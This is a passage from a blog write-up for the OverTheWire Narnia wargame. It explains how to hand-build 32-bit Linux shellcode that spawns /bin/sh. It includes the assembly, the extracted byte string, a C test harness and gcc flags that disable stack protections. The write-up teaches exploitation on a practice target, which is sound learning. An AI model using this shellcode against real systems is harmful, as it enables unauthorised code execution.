+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80489</span><span class="n">dd</span><span class="o">:</span>       <span class="n">c7</span> <span class="m">45</span> <span class="n">f0</span> <span class="m">08</span> <span class="n">c3</span> <span class="m">0</span><span class="n">b</span> <span class="m">08</span>    <span class="n">movl</span>   <span class="o">$</span><span class="mh">0x80bc308</span><span class="p">,</span><span class="m">-0</span><span class="nf">x10</span><span class="p">(</span>%<span class="n">ebp</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Next up is the <code>NULL</code> to be stored in adjacent memory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80489e4</span><span class="o">:</span>       <span class="n">c7</span> <span class="m">45</span> <span class="n">f4</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    <span class="n">movl</span>   <span class="o">$</span><span class="mh">0x0</span><span class="p">,</span><span class="m">-0</span><span class="nf">xc</span><span class="p">(</span>%<span class="n">ebp</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Now to push a <code>NULL</code> onto the stack so we can populate the register with it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80489</span><span class="n">f1</span><span class="o">:</span>       <span class="m">6</span><span class="n">a</span> <span class="m">00</span>                   <span class="n">push</span>   <span class="o">$</span><span class="mh">0x0</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And next up the address to the array &ldquo;happy&rdquo; on to the stack:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80489</span><span class="n">f3</span><span class="o">:</span>       <span class="m">8</span><span class="n">d</span> <span class="m">55</span> <span class="n">f0</span>                <span class="n">lea</span>    <span class="m">-0</span><span class="nf">x10</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">edx</span>
+ <span class="m">80489</span><span class="n">f6</span><span class="o">:</span>       <span class="m">52</span>                      <span class="n">push</span>   %<span class="n">edx</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And finally the address to string onto the stack:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80489</span><span class="n">eb</span><span class="o">:</span>       <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="n">f0</span>                <span class="n">mov</span>    <span class="m">-0</span><span class="nf">x10</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">eax</span>
+ <span class="m">80489</span><span class="n">f7</span><span class="o">:</span>       <span class="m">50</span>                      <span class="n">push</span>   %<span class="n">eax</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And now breaking down <code>execve</code>, first the <code>NULL</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">806</span><span class="n">d711</span><span class="o">:</span>       <span class="m">8</span><span class="n">b</span> <span class="m">54</span> <span class="m">24</span> <span class="m">10</span>             <span class="n">mov</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%esp),%</span><span class="n">edx</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Next the address for the array (<code>happy</code>):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">806</span><span class="n">d715</span><span class="o">:</span>       <span class="m">8</span><span class="n">b</span> <span class="m">4</span><span class="n">c</span> <span class="m">24</span> <span class="m">0</span><span class="n">c</span>             <span class="n">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%esp),%</span><span class="n">ecx</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And once again (<code>happy[0]</code>):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">806</span><span class="n">d719</span><span class="o">:</span>       <span class="m">8</span><span class="n">b</span> <span class="m">5</span><span class="n">c</span> <span class="m">24</span> <span class="m">08</span>             <span class="n">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%esp),%</span><span class="n">ebx</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And finally the magic value of <code>0xb</code> for the <code>execve</code> <code>syscall</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">806</span><span class="n">d71d</span><span class="o">:</span>       <span class="n">b8</span> <span class="m">0</span><span class="n">b</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          <span class="n">mov</span>    <span class="o">$</span><span class="mh">0xb</span><span class="p">,</span>%<span class="n">eax</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Once the stack is prepared we call into the magic function that ultimately gets us to <code>&lt;_dl_sysinfo_int80&gt;</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">806</span><span class="n">d722</span><span class="o">:</span>       <span class="n">ff</span> <span class="m">15</span> <span class="n">f0</span> <span class="n">b9</span> <span class="m">0</span><span class="n">e</span> <span class="m">08</span>       <span class="n">call</span>   <span class="o">*</span><span class="mh">0x80eb9f0</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Which is just:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">8070140</span><span class="o">:</span>       <span class="n">cd</span> <span class="m">80</span>                   <span class="n">int</span>    <span class="o">$</span><span class="mh">0x80</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>There are two things we need to keep in mind when preparing the shellcode.</p>
+<ol>
+<li>
+<p>Be clever in removing the nullbytes/null terminators (<code>\x0</code>) from the assembly code. If we were to just use the the assembly <code>b8 0b 00 00 00</code> as the input, everything would go wrong since <code>\x00</code> is a null terminator, therefore something clever needs to be done.</p>
+</li>
+<li>
+<p>Need to figure out a way to do relative addressing, since it is not possible to safety rely on any address of the string.
+The trick is using a jump, followed by a call backwards, forming a bit of sandwich of code. The sandwich method roughly has this outline:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s">    <span class="n">jmp</span> <span class="n">short</span> <span class="n">GotoCall</span>        <span class="c1"># The jmp to a label</span>
+    <span class="n">shellcode</span><span class="o">:</span>
+        <span class="n">pop</span>              <span class="o">$</span><span class="n">esi</span>
+    <span class="kc">...</span>
+    <span class="o">&lt;</span><span class="n">shellcode</span> <span class="n">goodness</span><span class="o">&gt;</span>
+    <span class="kc">...</span>
+    <span class="n">GotoCall</span><span class="o">:</span>
+        <span class="n">call</span>        <span class="n">shellcode</span> <span class="c1"># call backwards to the shellcode</span>
+        <span class="n">db</span>         <span class="s">&#39;/bin/sh/&#39;</span> <span class="c1"># define byte of the string</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<p>The <code>pop $esi</code> is important here, since it&rsquo;ll put the address of <code>'/bin/sh'</code> into <code>$esi</code>. This happens since the return address from the <code>call</code> will be the address of the next instruction after the call, and it was pushed into the stack when doing <code>call</code>. From there we can use relative addressing to <code>$esi</code>, no need to worry about specific memory addresses.</p>
+<p>Now to put it all together:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">Section</span>              <span class="n">.text</span>
+    <span class="n">global</span>           <span class="n">_start</span>
+<span class="n">_start</span><span class="o">:</span>
+    <span class="n">jmp</span> <span class="n">short</span>          <span class="n">GotoCall</span>
+<span class="n">shellcode</span><span class="o">:</span>
+    <span class="n">pop</span>                <span class="n">esi</span>             <span class="c1"># Get the &#34;ret&#34; address which is just the define byte</span>
+    <span class="n">xor</span>                <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>        <span class="c1"># This fills eax with all zeros, avoids the `\x00`</span>
+    <span class="n">mov</span> <span class="n">byte</span>           <span class="n">[esi</span> <span class="o">+</span> <span class="m">7</span><span class="n">]</span><span class="p">,</span> <span class="n">al</span>   <span class="c1"># Moves a 0 to the &#34;J&#34;, could use AH?</span>
+    <span class="n">lea</span>                <span class="n">ebx</span><span class="p">,</span> <span class="n">[esi]</span>      <span class="c1"># $esi stores start of string so copy to ebx</span>
+    <span class="n">mov</span> <span class="n">long</span>           <span class="n">[esi</span> <span class="o">+</span> <span class="m">8</span><span class="n">]</span><span class="p">,</span> <span class="n">ebx</span>  <span class="c1"># Copy address of $esi over the &#34;AAAA&#34;</span>
+    <span class="n">mov</span> <span class="n">long</span>           <span class="n">[esi</span> <span class="o">+</span> <span class="m">12</span><span class="n">]</span><span class="p">,</span> <span class="n">eax</span> <span class="c1"># Fill &#34;BBBB&#34; will NULLs</span>
+    <span class="n">mov</span> <span class="n">byte</span>           <span class="n">al</span><span class="p">,</span> <span class="mh">0x0b</span>        <span class="c1"># No longer need \x0 from $eax, fill the magic value</span>
+    <span class="n">mov</span>                <span class="n">ebx</span><span class="p">,</span> <span class="n">esi</span>        <span class="c1"># Load $ebx with address of the string</span>
+    <span class="n">lea</span>                <span class="n">ecx</span><span class="p">,</span> <span class="n">[esi</span> <span class="o">+</span> <span class="m">8</span><span class="n">]</span>  <span class="c1"># Load the address stored where &#34;AAAA&#34; was</span>
+    <span class="n">lea</span>                <span class="n">edx</span><span class="p">,</span> <span class="n">[esi</span> <span class="o">+</span> <span class="m">12</span><span class="n">]</span> <span class="c1"># Load the NULLs where &#34;BBBB&#34; was</span>
+    <span class="n">int</span>                <span class="mh">0x80</span>            <span class="c1"># System call time</span>
+<span class="n">GotoCall</span><span class="o">:</span>
+    <span class="n">call</span> <span class="n">shellcode</span>
+    <span class="n">db</span> <span class="s">&#39;/bin/shJAAAABBBB&#39;</span> <span class="c1"># Add some dummy values that will get over written, db is define byte, sort of an alloc for our string</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Note, the order of populating our registers isn&rsquo;t in the same order as our disassembly from our C program. The important thing here is making sure the correct registers are filled with the correct values. I.e. The disassembly showed that the value of <code>0xb</code> was stored in <code>$eax</code>, so we accomplish this with <code>$al</code>. The address of the string needed to be in <code>$ebx</code>. <code>$ecx</code> and <code>$ebx</code> get the junk data.</p>
+<p>Compile with:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia1@narnia:/tmp/mymyown$ nasm -f elf execv2.asm
+</code></pre></td></tr></table>
+</div>
+</div><p>Link with <code>elf-i386</code> (since targeting <code>32bit</code>):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia1@narnia:/tmp/mymyown$ ld -m elf_i386 -o execv2.2 execv2.o
+</code></pre></td></tr></table>
+</div>
+</div><p>Now use <code>objdump</code> to check out waht the final assembly code looks like and start verifying that it&rsquo;s as expected, and most importantly making sure there&rsquo;s no <code>\x00</code> bytes:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia1</span><span class="o">@</span><span class="n">narnia</span><span class="o">:/</span><span class="n">tmp</span><span class="o">/</span><span class="n">mymyown</span><span class="o">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">execv2.2</span>
+<span class="n">execv2.2</span><span class="o">:</span>     <span class="n">file</span> <span class="n">format</span> <span class="n">elf32</span><span class="o">-</span><span class="n">i386</span>
+<span class="n">Disassembly</span> <span class="n">of</span> <span class="n">section</span> <span class="n">.text</span><span class="o">:</span>
+<span class="m">08048060</span> <span class="o">&lt;</span><span class="n">_start</span><span class="o">&gt;:</span>
+ <span class="m">8048060</span><span class="o">:</span> <span class="n">eb</span> <span class="m">1</span><span class="n">a</span>                <span class="n">jmp</span>    <span class="m">804807</span><span class="n">c</span> <span class="o">&lt;</span><span class="n">GotoCall</span><span class="o">&gt;</span>
+<span class="m">08048062</span> <span class="o">&lt;</span><span class="n">shellcode</span><span class="o">&gt;:</span>
+ <span class="m">8048062</span><span class="o">:</span> <span class="m">5</span><span class="n">e</span>                   <span class="n">pop</span>    <span class="o">%esi
+</span><span class="o"> 8048063: 31 c0                xor    %</span><span class="n">eax</span><span class="p">,</span><span class="o">%eax
+</span><span class="o"> 8048065: 88 46 07             mov    %</span><span class="n">al</span><span class="p">,</span><span class="mh">0x7</span><span class="p">(</span><span class="o">%esi)
+</span><span class="o"> 8048068: 8d 1e                lea    (%</span><span class="n">esi</span><span class="p">),</span><span class="o">%ebx
+</span><span class="o"> 804806a: 89 5e 08             mov    %</span><span class="n">ebx</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%esi)
+</span><span class="o"> 804806d: 89 46 0c             mov    %</span><span class="n">eax</span><span class="p">,</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%esi)
+</span><span class="o"> 8048070: b0 0b                mov    $0xb,%</span><span class="n">al</span>
+ <span class="m">8048072</span><span class="o">:</span> <span class="m">89</span> <span class="n">f3</span>                <span class="n">mov</span>    <span class="o">%esi,%</span><span class="n">ebx</span>
+ <span class="m">8048074</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">4</span><span class="n">e</span> <span class="m">08</span>             <span class="n">lea</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%esi),%</span><span class="n">ecx</span>
+ <span class="m">8048077</span><span class="o">:</span> <span class="m">8</span><span class="n">d</span> <span class="m">56</span> <span class="m">0</span><span class="n">c</span>             <span class="n">lea</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%esi),%</span><span class="n">edx</span>
+ <span class="m">804807</span><span class="n">a</span><span class="o">:</span> <span class="n">cd</span> <span class="m">80</span>                <span class="n">int</span>    <span class="o">$</span><span class="mh">0x80</span>
+<span class="m">0804807</span><span class="n">c</span> <span class="o">&lt;</span><span class="n">GotoCall</span><span class="o">&gt;:</span>
+ <span class="m">804807</span><span class="n">c</span><span class="o">:</span> <span class="n">e8</span> <span class="n">e1</span> <span class="n">ff</span> <span class="n">ff</span> <span class="n">ff</span>       <span class="n">call</span>   <span class="m">8048062</span> <span class="o">&lt;</span><span class="n">shellcode</span><span class="o">&gt;</span>
+ <span class="m">8048081</span><span class="o">:</span> <span class="m">2</span><span class="n">f</span>                   <span class="n">das</span>                             <span class="c1"># /</span>
+ <span class="m">8048082</span><span class="o">:</span> <span class="m">62</span> <span class="m">69</span> <span class="m">6</span><span class="n">e</span>             <span class="n">bound</span>  <span class="o">%ebp,0x6e(%</span><span class="n">ecx</span><span class="p">)</span>          <span class="c1"># bin</span>
+ <span class="m">8048085</span><span class="o">:</span> <span class="m">2</span><span class="n">f</span>                   <span class="n">das</span>                             <span class="c1"># /</span>
+ <span class="m">8048086</span><span class="o">:</span> <span class="m">73</span> <span class="m">68</span>                <span class="n">jae</span>    <span class="m">80480</span><span class="n">f0</span> <span class="o">&lt;</span><span class="n">GotoCall</span><span class="m">+0</span><span class="n">x74</span><span class="o">&gt;</span>  <span class="c1"># sh</span>
+ <span class="m">8048088</span><span class="o">:</span> <span class="m">4</span><span class="n">a</span>                   <span class="n">dec</span>    <span class="o">%edx                     # j
+</span><span class="o"> 8048089: 41                   inc    %</span><span class="n">ecx</span>                     <span class="c1"># A</span>
+ <span class="m">804808</span><span class="n">a</span><span class="o">:</span> <span class="m">41</span>                   <span class="n">inc</span>    <span class="o">%ecx                     # A
+</span><span class="o"> 804808b: 41                   inc    %</span><span class="n">ecx</span>                     <span class="c1"># A</span>
+ <span class="m">804808</span><span class="n">c</span><span class="o">:</span> <span class="m">41</span>                   <span class="n">inc</span>    <span class="o">%ecx                     # A
+</span><span class="o"> 804808d: 42                   inc    %</span><span class="n">edx</span>                     <span class="c1"># B</span>
+ <span class="m">804808</span><span class="n">e</span><span class="o">:</span> <span class="m">42</span>                   <span class="n">inc</span>    <span class="o">%edx                     # B
+</span><span class="o"> 804808f: 42                   inc    %</span><span class="n">edx</span>                     <span class="c1"># B</span>
+ <span class="m">8048090</span><span class="o">:</span> <span class="m">42</span>                   <span class="n">inc</span>    %<span class="n">edx</span>                     <span class="c1"># B</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Since it all looks good, time to convert it to some shellcode, using a bit CommandlineFu for extracting the shell code easily:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia1@narnia:/tmp/mymyown$ objdump -d ./&lt;BINARY&gt;<span class="p">|</span>grep <span class="s1">&#39;[0-9a-f]:&#39;</span><span class="p">|</span>grep -v <span class="s1">&#39;file&#39;</span><span class="p">|</span>cut -f2 -d:<span class="p">|</span>cut -f1-6 -d<span class="s1">&#39; &#39;</span><span class="p">|</span>tr -s <span class="s1">&#39; &#39;</span><span class="p">|</span>tr <span class="s1">&#39;\t&#39;</span> <span class="s1">&#39; &#39;</span><span class="p">|</span>sed <span class="s1">&#39;s/ $//g&#39;</span><span class="p">|</span>sed <span class="s1">&#39;s/ /\\x/g&#39;</span><span class="p">|</span>paste -d <span class="s1">&#39;&#39;</span> -s <span class="p">|</span>sed <span class="s1">&#39;s/^/&#34;/&#39;</span><span class="p">|</span>sed <span class="s1">&#39;s/$/&#34;/g&#39;</span>
+<span class="s2">&#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Create a test app, using a ton of <code>()</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia1@narnia:/tmp/mymyown$ cat shelltry.c
+char shellcode<span class="o">[]</span> <span class="o">=</span> <span class="s2">&#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34;</span><span class="p">;</span>
+int main<span class="o">()</span> <span class="o">{</span>
+ int <span class="o">(</span>*ret<span class="o">)()</span><span class="p">;</span>
+ <span class="nv">ret</span> <span class="o">=</span> <span class="o">(</span>int <span class="o">(</span>*<span class="o">)())</span>shellcode<span class="p">;</span>
+ <span class="o">(</span>int<span class="o">)(</span>*ret<span class="o">)()</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Compile and disable security with a ton of options:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia1@narnia:/tmp/mymyown$ gcc -o shelltry shelltry.c -m32 -Wl,-z,norelro -z execstack -fno-stack-protector -fno-pie
+</code></pre></td></tr></table>
+</div>
+</div><p>Run it and verify it works. If all went well, the <code>shelltry</code> should spawn a shell. Going forward it should be possible to use this shellcode for all of the narnia challenges and we no longer have to rely on something created by someone else.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-07-04</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://noopz.github.io/shellcode-on-narnia/" data-title="Creating ShellCode On Narnia" data-hashtags="OTW,narnia,wargames,shellcode"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://noopz.github.io/shellcode-on-narnia/" data-hashtag="OTW"><i class="fab fa-facebook-square fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/otw/">OTW</a>,&nbsp;<a href="/tags/narnia/">narnia</a>,&nbsp;<a href="/tags/wargames/">wargames</a>,&nbsp;<a href="/tags/shellcode/">shellcode</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/narnia_challenges_part1/" class="prev" rel="prev" title="Narnia Challenges (part 1)"><i class="fas fa-angle-left fa-fw"></i>Narnia Challenges (part 1)</a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Zack</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">cc by-nc 4.0</a></span><br><span class="asdf">&nbsp;<a href="/privacy" target="">Privacy Policy</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{},"cookieconsent":{"content":{"allow":"Allow cookies","deny":"Decline","dismiss":"Allow cookies","link":"Learn more","message":"This website uses cookies to ensure you get the best experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"revokable":false,"theme":"edgeless","type":"info"},"gtagConfig":{"anonymize_ip":true,"enable":true,"tracking_id":"UA-168052344-1"}};</script><script type="text/javascript" src="/js/theme.min.cb3f77989212bebcd498d8b441c555574e00a1a1250508a430cf215c9f45bef736e721d5005ef144b47b2cd3997c2175c03977c50086fe4016eab32a8fe118b6.js" integrity="sha512-yz93mJISvrzUmNi0QcVVV04AoaElBQikMM8hXJ9Fvvc25yHVAF7xRLR7LNOZfCF1wDl3xQCG/kAW6rMqj&#43;EYtg=="></script>
+</body>
+</html>
